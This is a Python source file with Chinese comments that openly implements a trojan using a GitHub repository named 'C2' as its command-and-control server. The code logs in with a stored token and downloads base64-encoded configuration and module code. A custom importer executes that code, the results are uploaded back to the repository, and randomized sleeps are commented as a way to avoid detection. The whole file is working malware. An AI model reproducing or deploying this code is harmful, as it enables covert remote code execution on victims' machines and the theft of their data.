# -*- coding:utf-8 -*-
"""
作者：shinian
创建日期：2024/5/17 21:08
"""
import base64  # 用于Base64编码和解码
import importlib  # 用于动态导入模块
import json  # 用于解析JSON数据
import random  # 用于生成随机数
import sys  # 用于系统相关的操作
import threading  # 用于多线程操作
import time  # 用于时间相关操作
from datetime import datetime  # 用于日期时间操作

import github3  # 用于GitHub API操作


# 读取token，连接到GitHub，创建一个session连接
def github_connect():
    with open('mytoken.txt') as fp:
        token = fp.read()  # 读取存储在文件中的GitHub token
    user = 'shinianyunyan'  # GitHub用户名
    sess = github3.login(token=token)  # 使用token登录GitHub，创建session
    return sess.repository(user, 'C2')  # 返回指定的仓库对象


# 获取文件路径等内容，以便读取配置文件和模块源码(从 GitHub 仓库中获取指定目录和文件名的文件内容)
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content  # 从GitHub仓库中获取文件内容


# 木马类
class Trojan:
    def __init__(self, id):
        self.id = id  # 木马ID
        self.config_file = f'{id}.json'  # 配置文件路径
        self.data_path = f'data/{id}/'  # 数据存储路径
        self.repo = github_connect()  # 连接到GitHub仓库

    # 从仓库中读取和解码远程配置文件
    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)  # 读取配置文件内容
        config = json.loads(base64.b64decode(config_json))  # 解码并解析JSON配置文件

        # 检查指定的模块是否已经在当前环境中导入
        for task in config:
            if task['module'] not in sys.modules:
                # 动态导入模块
                exec(f"import {task['module']}")
        return config

    # 执行模块
    def module_runner(self, module):
        result = sys.modules[module].run()  # 执行模块中的run方法
        self.store_module_result(result)  # 存储模块执行结果

    # 创建一个名为当前时间的文件，并将模块输出结果保存到文件中，上传至仓库中
    def store_module_result(self, data):
        message = datetime.now().isoformat()  # 使用当前时间作为文件名
        remote_path = f'data/{self.id}/{message}.data'  # 生成远程路径
        bindata = bytes('%r' % data, 'utf-8')  # 将结果转换为字节
        # self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub

        # 创建存储结果的文件夹（如果不存在）
        if not self.repo.contents(f'data/{self.id}'):
            self.repo.create_directory(f'data/{self.id}')

        self.repo.create_file(remote_path, message, base64.b64encode(bindata))  # 创建文件并上传到GitHub

    # 运行木马
    def run(self):
        while True:
            config = self.get_config()  # 获取配置文件
            for task in config:
                # 每个模块都在一个独立的线程中执行
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))  # 随机等待一段时间，防止被发现

            time.sleep(random.randint(30 * 60, 3 * 60 * 60))  # 随机等待30分钟到3小时，再次获取配置文件


# 自定义模块导入器
class GitImporter:
    def __init__(self):
        self.repo = github_connect()  # 连接github仓库，创建对象
        self.current_module_code = ""  # 当前模块的代码

    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve {name}")  # 尝试获取模块
        # self.repo = github_connect()

        new_library = get_file_contents('modules', f'{name}.py', self.repo)  # 获取模块代码
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)  # 解码模块代码
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)  # 创建模块对象
        exec(self.current_module_code, new_module.__dict__)  # 执行模块代码
        sys.modules[spec.name] = new_module  # 将模块添加到sys.modules中
        return new_module


if __name__ == '__main__':
    sys.meta_path.append(GitImporter())  # 添加自定义模块导入器
    trojan = Trojan('TROJANID')  # 创建木马对象
    trojan.run()  # 运行木马
